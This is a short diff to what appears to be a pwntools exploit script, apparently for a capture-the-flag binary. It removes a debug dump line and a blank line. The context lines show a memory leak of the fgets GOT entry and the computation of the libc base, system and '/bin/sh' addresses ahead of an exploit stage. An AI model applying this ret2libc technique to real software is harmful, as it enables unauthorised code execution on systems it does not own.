@@ -153,7 +153,6 @@ p.sendline(stage1)
 
 leak = p.recv(4096)
 
-dump(leak,"leak.bin")
 fgets_got_entry = u32(leak[0:4])
 
 log.info("fgets got address : {}".format(hex(fgets_got_entry)))
@@ -166,7 +165,6 @@ system_addr = libc_base_addr + system_libc_addr
 log.info("libc base addr is : {}".format(hex(libc_base_addr)))
 log.info("/bin/sh string addr is : {}".format(hex(bin_sh_addr)))
 log.info("system addr is : {}".format(hex(system_addr)))
-
 
 
 # step 2 : exploit
